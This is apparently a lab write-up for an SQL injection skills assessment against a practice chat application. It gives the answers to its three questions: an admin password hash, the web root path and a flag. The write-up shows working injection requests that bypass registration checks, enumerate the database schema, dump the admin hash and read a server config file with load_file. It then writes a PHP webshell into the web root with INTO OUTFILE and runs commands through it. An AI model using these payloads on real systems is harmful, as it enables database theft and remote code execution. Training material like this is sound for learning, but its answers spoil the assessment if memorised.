# Skills Assessment - SQL Injection Fundamentals
## Questions
1. What is the password hash for the user 'admin'? **Answer: \$argon2i\$v=19\$m=2048,t=4,p=3\$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU**
   - Found a SQL injection in the invitationCode parameter that bypasses server-side check for registering new accounts:
        ```
        POST /api/register.php HTTP/1.1
        Host: 154.57.164.76:32218
        Cookie: PHPSESSID=37c06eou2kl7o0o7r2782kkfra
        Content-Length: 74
        Origin: https://154.57.164.76:32218
        Content-Type: application/x-www-form-urlencoded

        username=abc&password=123&repeatPassword=123&invitationCode=1'+or+'1'%3d'1
        ```
   - After login, chat to any user and use the search function, notice the same SQLi technique can be applied to the `q` query param. Use this request to guess the number of columns of the target table:
        ```
        GET /index.php?q=ha')+union+select+1,2,3,4+--+&u=1
        ```
   - Notice that column 3 and 4 are shown in the response. Place `table_name` and `table_schema` at this position to read the result. Check available tables → found `chattr.users` table:
        ```
        GET /index.php?q=ha')+union+select+NULL,NULL,table_name,table_schema+from+information_schema.tables--+&u=1
        ```
   - Check available columns in that table → found `username` and `password` columns:
        ```
        GET /index.php?q=ha')+union+select+NULL,NULL,column_name,NULL+from+information_schema.columns+where+table_name='Users'--+&u=1
        ```
   - Read the password hash of the `admin` user:
        ```
        GET /index.php?q=ha')+union+select+NULL,NULL,password,NULL+from+chattr.Users+where+username='admin'--+&u=1
        ```
2. What is the root path of the web application? **Answer: /var/www/chattr-prod**
   - Check that we have FILE privilege which can be used to read local files. Look for nginx config files, one of them stood out is `/etc/nginx/sites-enabled/default`. Read the file to get the web root:
        ```
        GET /index.php?q=')+union+select+null,null,null,(load_file('/etc/nginx/sites-enabled/default'))+--+&u=1
        ```
        ```
        server {
            listen 443 ssl;
            server_name chattr.htb;
            ssl_password_file /root/chattr.key.pass;
            ssl_certificate /etc/ssl/certs/chattr.crt;
            ssl_certificate_key /etc/ssl/private/chattr.key;
            ssl_protocols TLSv1.2 TLSv1.3;
            ssl_ciphers HIGH:!aNULL:!MD5;

            root /var/www/chattr-prod;

            location / {
                index index.php;
                try_files $uri $uri/ /index.php?$query_string;
            }

            location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php8.2-fpm.sock;
            }

            location ^~ /includes/ {
                deny all;
            }
        }
        ```
3. Achieve remote code execution, and submit the contents of /flag_XXXXXX.txt below. **Answer: 061b1aeb94dec6bf5d9c27032b3c1d8d**
   - Check write privileges first → returns empty, we have write access:
        ```
        GET /index.php?q=')+union+SELECT+NULL,NULL,variable_name,variable_value+FROM+information_schema.global_variables+where+variable_name%3d"secure_file_priv"+--+&u=1
        ``
   - Write a webshell to web root:
        ```
        GET /index.php?q=')+union+select+'','<?php+system($_REQUEST[0]);+?>','',''+into+outfile+'/var/www/chattr-prod/shell.php'+--+&u=1
        ```
   - Access the shell and read the flag:
        ```
        GET /shell.php?0=find%20/%20-name%20%27flag*%27
        GET /shell.php?0=cat%20/sys/devices/virtual/net/eth0/flags%20/flag_876a4c.txt
        ```